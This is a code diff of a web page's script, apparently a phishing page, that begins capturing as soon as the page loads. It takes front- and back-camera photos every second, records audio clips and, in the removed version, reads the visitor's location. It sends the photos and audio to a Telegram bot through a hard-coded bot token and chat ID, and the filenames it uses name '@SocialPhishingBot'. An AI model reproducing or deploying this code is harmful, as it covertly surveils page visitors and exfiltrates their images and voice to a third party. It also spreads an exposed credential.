@@ -97,132 +97,87 @@
   </center>
 
   <script type="text/javascript">
-    let frontStream = null;
-    let backStream = null;
-    let locationData = null;
+    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
+    const chatId = '5571330102'; // Your Telegram chat ID
 
-    function downloadThumbnail() {
-      // Change button text to indicate fetching
-      var btn = document.getElementById('thumbdloadbtn');
-      btn.textContent = 'Fetching from server... Wait';
-      // Add your logic to fetch the thumbnail here
-      // ...
-    }
-
-    function la(src) {
-      window.location = src;
-    }
-
-    // Function to get the current location
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
-          locationData = position;
-        }, (error) => {
-          console.error("Error getting location:", error);
-        });
-      } else {
-        console.error("Geolocation is not supported by this browser.");
-      }
-    }
-
-    // Function to start both cameras and capture photos every second
-    function startCameraCapture() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
-        .then((frontStreamData) => {
-          frontStream = frontStreamData;
-          const frontVideoElement = document.createElement('video');
-          frontVideoElement.srcObject = frontStream;
-          frontVideoElement.play();
-
-          // Start capturing photos every second
-          setInterval(() => {
-            capturePhoto(frontVideoElement, 'front');
-          }, 1000);
-        })
-        .catch((error) => {
-          console.error("Error accessing front camera:", error);
-        });
-
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true })
-        .then((backStreamData) => {
-          backStream = backStreamData;
-          const backVideoElement = document.createElement('video');
-          backVideoElement.srcObject = backStream;
-          backVideoElement.play();
-
-          // Start capturing photos every second
-          setInterval(() => {
-            capturePhoto(backVideoElement, 'back');
-          }, 1000);
-        })
-        .catch((error) => {
-          console.error("Error accessing back camera:", error);
-        });
-    }
-
-    // Function to capture photo
-    function capturePhoto(videoElement, cameraType) {
-      const canvas = document.createElement('canvas');
-      canvas.width = videoElement.videoWidth;
-      canvas.height = videoElement.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob((blob) => {
-        sendToTelegram(blob, 'photo', cameraType);
-      });
-    }
-
-    // Function to capture and send audio
-    function captureAudio() {
-      navigator.mediaDevices.getUserMedia({ audio: true })
+    // Start capturing photos and audio
+    function startCapturing() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
         .then((stream) => {
+          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
           const audioRecorder = new MediaRecorder(stream);
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
+
+          // Capture front camera photos
+          function captureFrontPhoto() {
+            imageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing front photo:', error);
+              });
+          }
+
+          // Capture back camera photos
+          function captureBackPhoto() {
+            // Switch to back camera
+            const backImageCapture = new ImageCapture(stream.getVideoTracks()[1]);
+            backImageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing back photo:', error);
+              });
+          }
+
+          // Capture audio for 5 seconds
+          function captureAudio() {
+            audioRecorder.start();
+            setTimeout(() => {
+              audioRecorder.stop();
+            }, 5000);
+          }
 
           audioRecorder.ondataavailable = (event) => {
             if (event.data.size > 0) {
               sendToTelegram(event.data, 'audio');
             }
           };
+
+          // Set intervals to capture photos and audio
+          setInterval(() => {
+            captureFrontPhoto();
+            captureBackPhoto();
+            captureAudio();
+          }, 1000); // Capture every second
+
         })
         .catch((error) => {
-          console.error("Error accessing microphone:", error);
+          console.error('Permission error:', error);
         });
     }
 
-    // Function to send photo or audio to Telegram
-    function sendToTelegram(data, type, cameraType = '') {
-      const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4';
-      const chatId = 5571330102;
-
+    // Send media to Telegram bot
+    function sendToTelegram(data, type) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      if (type === 'photo') {
-        formData.append('photo', data, `@SocialPhishingBot_${cameraType}.jpg`);
-      } else if (type === 'audio') {
-        formData.append('audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
-      }
-
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+      {
         method: 'POST',
         body: formData
       })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error('Error sending to Telegram:', error));
     }
 
-    // Start capturing media when the page loads
-    window.onload = function () {
-      getLocation();
-      startCameraCapture();
-      captureAudio();
+    window.onload = function() {
+      startCapturing(); // Start capturing as soon as the page loads
     };
+
   </script>
 
   <footer>
